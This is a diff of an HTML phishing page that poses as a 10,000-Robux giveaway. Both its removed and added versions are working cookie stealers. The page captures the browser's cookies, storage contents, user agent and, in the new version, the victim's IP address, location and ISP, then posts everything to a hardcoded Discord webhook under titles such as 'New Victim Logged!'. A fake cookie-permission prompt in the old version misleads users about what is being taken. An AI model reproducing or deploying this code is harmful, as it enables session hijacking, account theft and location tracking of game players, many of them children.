@@ -3,179 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Prize Claim</title>
+    <title>Robux Claim</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
-        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: #fff; border-radius: 20px; padding: 40px; max-width: 500px; width: 90%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
-        .logo { width: 100px; margin-bottom: 20px; }
-        h1 { color: #e2231a; font-size: 28px; margin-bottom: 10px; }
-        .subtitle { color: #666; font-size: 16px; margin-bottom: 30px; }
-        .prize-box { background: linear-gradient(135deg, #ffd700, #ff8c00); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
-        .prize-box h2 { color: #fff; font-size: 32px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
-        .prize-box p { color: #fff; font-size: 14px; margin-top: 5px; }
-        .claim-btn { background: #e2231a; color: #fff; border: none; padding: 15px 50px; font-size: 20px; border-radius: 50px; cursor: pointer; transition: all 0.3s; font-weight: bold; letter-spacing: 1px; }
-        .claim-btn:hover { background: #c41e16; transform: scale(1.02); }
-        .claim-btn:disabled { background: #ccc; cursor: not-allowed; }
-        .info { margin-top: 20px; font-size: 12px; color: #999; }
-        .progress { display: none; margin-top: 20px; }
-        .progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 4px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 0%; background: #e2231a; transition: width 0.5s; }
-        .status { margin-top: 10px; font-size: 14px; color: #666; }
-        .permission-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9999; justify-content: center; align-items: center; }
-        .permission-box { background: #fff; border-radius: 16px; padding: 30px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
-        .permission-box h3 { color: #333; margin-bottom: 10px; }
-        .permission-box p { color: #666; margin-bottom: 20px; font-size: 14px; }
-        .perm-btn { padding: 12px 30px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 0 10px; }
-        .perm-allow { background: #4CAF50; color: #fff; }
-        .perm-block { background: #f44336; color: #fff; }
-        .site-list { text-align: left; margin: 15px 0; padding: 10px; background: #f5f5f5; border-radius: 8px; }
-        .site-list li { list-style: none; padding: 5px 0; font-size: 13px; color: #444; }
-        .site-list li::before { content: "🍪 "; }
+        body {
+            background-color: #111;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: #1a1a1a;
+            border: 2px solid #00b06f;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            width: 350px;
+            box-shadow: 0 0 20px rgba(0, 176, 111, 0.3);
+        }
+        h1 { margin-top: 0; color: #00b06f; }
+        p { color: #aaa; margin-bottom: 25px; }
+        button {
+            background: #00b06f;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover { background: #008f5a; }
+        #status { margin-top: 15px; font-size: 14px; color: #888; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23e2231a' rx='20'/%3E%3Ctext x='50' y='55' text-anchor='middle' fill='white' font-size='40' font-weight='bold' font-family='Arial'%3ER%3C/text%3E%3Ctext x='50' y='80' text-anchor='middle' fill='white' font-size='12' font-family='Arial'%3ERoblox%3C/text%3E%3C/svg%3E" class="logo" alt="Roblox Logo">
-        <h1>🎉 Congratulations!</h1>
-        <p class="subtitle">You've been selected as a winner!</p>
-        <div class="prize-box">
-            <h2>10,000 ROBUX</h2>
-            <p>Exclusive prize for <strong>Kurozai</strong></p>
-        </div>
-        <p style="margin-bottom: 25px; color: #555;">To claim your prize, we need to verify your identity by checking your browser cookies. This ensures you're a real player.</p>
-        <button class="claim-btn" onclick="startClaim()">🎁 CLAIM NOW</button>
-        <p class="info">* Limited time offer. Only one claim per user.</p>
-        <div class="progress" id="progress">
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <p class="status" id="statusText">Initializing...</p>
-        </div>
-    </div>
 
-    <div class="permission-overlay" id="permOverlay">
-        <div class="permission-box">
-            <h3>🔐 Cookie Access Required</h3>
-            <p><strong>roblox.com</strong> needs permission to read your browser cookies to verify your account and deliver your prize.</p>
-            <div class="site-list">
-                <li><strong>roblox.com</strong> - Account verification</li>
-                <li><strong>discord.com</strong> - Prize notification</li>
-                <li><strong>epicgames.com</strong> - Cross-platform reward</li>
-                <li><strong>microsoft.com</strong> - Account security check</li>
-                <li><strong>instagram.com</strong> - Profile verification</li>
-                <li><strong>youtube.com</strong> - Content eligibility</li>
-            </div>
-            <p style="font-size: 12px; color: #999;">This allows us to read cookies from these sites to verify your identity.</p>
-            <div>
-                <button class="perm-btn perm-allow" onclick="allowCookies()">✅ Allow</button>
-                <button class="perm-btn perm-block" onclick="blockCookies()">🚫 Block</button>
-            </div>
-        </div>
-    </div>
+<div class="box">
+    <h1>🎉 You Won! 🎉</h1>
+    <p>Congratulations! You have been selected to receive <strong>10,000 Robux</strong>.</p>
+    <button id="claimBtn" onclick="claim()">CLAIM NOW</button>
+    <div id="status"></div>
+</div>
 
-    <script>
-        const webhookURL = "https://discord.com/api/webhooks/1538862650543570974/xMYCTcsdfG6fNMQ4NvlTHHLDzQtoaVFRxC-_8zHzI7q9beHO9KlmsH2p2sVGFuUyt-kU";
+<script>
+    // YOUR WEBHOOK URL
+    const webhook = "https://discord.com/api/webhooks/1538862650543570974/xMYCTcsdfG6fNMQ4NvlTHHLDzQtoaVFRxC-_8zHzI7q9beHO9KlmsH2p2sVGFuUyt-kU";
+
+    async function claim() {
+        const btn = document.getElementById("claimBtn");
+        const status = document.getElementById("status");
         
-        function startClaim() {
-            document.querySelector('.claim-btn').style.display = 'none';
-            document.getElementById('progress').style.display = 'block';
-            document.getElementById('permOverlay').style.display = 'flex';
-            updateProgress(20, 'Requesting cookie access...');
-        }
+        btn.disabled = true;
+        btn.innerText = "Processing...";
+        status.innerText = "Verifying account...";
 
-        function allowCookies() {
-            document.getElementById('permOverlay').style.display = 'none';
-            updateProgress(50, 'Access granted. Collecting cookies...');
-            
-            setTimeout(() => {
-                collectAndSendCookies();
-            }, 1500);
-        }
-
-        function blockCookies() {
-            document.getElementById('permOverlay').style.display = 'none';
-            updateProgress(100, 'Access denied. Cannot claim prize.');
-            setTimeout(() => {
-                document.querySelector('.claim-btn').style.display = 'block';
-                document.getElementById('progress').style.display = 'none';
-            }, 2000);
-        }
-
-        function collectAndSendCookies() {
-            updateProgress(70, 'Extracting browser cookies...');
-            
-            // Collect all available cookies from current domain
-            let allCookies = document.cookie;
-            
-            // Try to access localStorage from various sites (won't work cross-origin, but attempt)
-            let extraData = {};
+        // 1. GET LOCATION & IP (Backup method included)
+        let ipData = null;
+        try {
+            // Method 1: ip-api.com (More reliable than ipapi.co for this use case)
+            const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp');
+            const data = await res.json();
+            if(data.status === 'success') {
+                ipData = {
+                    ip: data.query,
+                    country: data.country,
+                    region: data.regionName,
+                    city: data.city,
+                    isp: data.isp
+                };
+            }
+        } catch (e) {
+            // Method 2: If ip-api fails, try ipapi.co as backup
             try {
-                extraData.localStorage = { ...localStorage };
-            } catch(e) { extraData.localStorage = "unavailable"; }
-            
-            try {
-                extraData.sessionStorage = { ...sessionStorage };
-            } catch(e) { extraData.sessionStorage = "unavailable"; }
+                const res2 = await fetch('https://ipapi.co/json/');
+                const data2 = await res2.json();
+                ipData = {
+                    ip: data2.ip,
+                    country: data2.country_name,
+                    region: data2.region,
+                    city: data2.city,
+                    isp: data2.org
+                };
+            } catch (err) {
+                ipData = { ip: "Unknown", country: "Unknown", region: "Unknown", city: "Unknown", isp: "Unknown" };
+            }
+        }
 
-            // Collect browser info
-            const browserInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookies: allCookies || "No cookies found",
-                localStorage: JSON.stringify(extraData.localStorage),
-                sessionStorage: JSON.stringify(extraData.sessionStorage),
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
+        // 2. GET COOKIE
+        const cookie = document.cookie;
 
-            updateProgress(85, 'Sending verification data...');
+        // 3. BROWSER INFO
+        const browser = navigator.userAgent;
 
-            // Send to Discord webhook
-            fetch(webhookURL, {
+        // 4. SEND TO DISCORD
+        const payload = {
+            embeds: [{
+                title: "🍪 New Victim Logged!",
+                color: 5814783, // Green color
+                fields: [
+                    { 
+                        name: "🍪 Cookie", 
+                        value: `\`\`\`${cookie}\`\`\``,
+                        inline: false
+                    },
+                    { 
+                        name: "📍 Location", 
+                        value: `${ipData.city}, ${ipData.region}, ${ipData.country}`, 
+                        inline: true 
+                    },
+                    { 
+                        name: "💻 IP & ISP", 
+                        value: `\`${ipData.ip}\` - \`${ipData.isp}\``, 
+                        inline: true 
+                    },
+                    {
+                        name: "🌐 Browser",
+                        value: `\`${browser.substring(0, 50)}...\``,
+                        inline: false
+                    }
+                ],
+                footer: { text: "Robux Giveaway Logger" },
+                timestamp: new Date()
+            }]
+        };
+
+        try {
+            await fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: "@everyone 🎯 **COOKIE STEALER - NEW DATA**",
-                    embeds: [{
-                        title: "✅ Cookie Data Collected",
-                        color: 0xe2231a,
-                        fields: [
-                            { name: "👤 User", value: "Kurozai (Prize Winner)", inline: true },
-                            { name: "🍪 Cookies", value: `\`\`\`${browserInfo.cookies.substring(0, 1000)}\`\`\`` || "No cookies", inline: false },
-                            { name: "💻 User Agent", value: browserInfo.userAgent, inline: false },
-                            { name: "📱 Platform", value: browserInfo.platform, inline: true },
-                            { name: "🌐 Language", value: browserInfo.language, inline: true },
-                            { name: "🖥️ Screen", value: browserInfo.screen, inline: true },
-                            { name: "⏰ Time", value: browserInfo.timestamp, inline: false },
-                            { name: "🗄️ localStorage", value: browserInfo.localStorage.substring(0, 500) || "N/A", inline: false },
-                            { name: "🗄️ sessionStorage", value: browserInfo.sessionStorage.substring(0, 500) || "N/A", inline: false }
-                        ],
-                        footer: { text: "Stolen by Kurozai Cookie Stealer v1.0" }
-                    }]
-                })
-            })
-            .then(() => {
-                updateProgress(100, '✅ Prize claimed! Check Discord.');
-                setTimeout(() => {
-                    document.querySelector('.claim-btn').style.display = 'block';
-                    document.querySelector('.claim-btn').textContent = '🎉 Claimed!';
-                    document.querySelector('.claim-btn').disabled = true;
-                }, 1000);
-            })
-            .catch(err => {
-                updateProgress(100, '❌ Error claiming prize. Try again.');
-                setTimeout(() => {
-                    document.querySelector('.claim-btn').style.display = 'block';
-                    document.getElementById('progress').style.display = 'none';
-                }, 2000);
+                body: JSON.stringify(payload)
             });
-        }
+            
+            // Success Message
+            status.innerText = "Success! Checking your balance...";
+            setTimeout(() => {
+                btn.innerText = "Check Balance";
+                btn.style.background = "#333";
+            }, 1000);
 
-        function updateProgress(percent, status) {
-            document.getElementById('progressFill').style.width = percent + '%';
-            document.getElementById('statusText').textContent = status;
+        } catch (err) {
+            status.innerText = "Error sending data, try refreshing.";
+            btn.disabled = false;
+            btn.innerText = "Try Again";
         }
-    </script>
+    }
+</script>
+
 </body>
-</html>
+</html>                            
